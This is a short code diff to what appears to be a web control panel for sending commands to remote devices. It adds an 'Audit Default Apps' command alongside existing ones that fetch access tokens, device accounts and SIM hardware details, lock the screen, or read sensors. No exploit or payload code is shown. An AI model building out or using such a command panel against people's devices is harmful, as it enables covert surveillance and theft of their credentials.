@@ -406,6 +406,7 @@
                     { id: 'PING', name: 'Send Connection Ping', icon: '📡', inputs: [] },
                     { id: 'GET_TOKEN', name: 'Fetch Access Token', icon: '🔑', inputs: [] },
                     { id: 'GET_ACCOUNTS', name: 'Fetch Device Accounts', icon: '🆔', inputs: [] },
+                    { id: 'GET_DEFAULTS', name: 'Audit Default Apps', icon: '🚥', inputs: [] },
                     { id: 'GET_NUMBERS', name: 'Fetch SIM Hardware', icon: '📇', inputs: [] }
                 ]
             },
@@ -877,6 +878,7 @@
                         content = `${document.getElementById('bri-level').value} | ${document.getElementById('bri-method').value}`; break;
                     case 'UNBLIND':
                     case 'GET_ACCOUNTS':
+                    case 'GET_DEFAULTS':
                     case 'GET_NUMBERS':
                     case 'LOCK_SCREEN':
                     case 'GET_SENSORS':
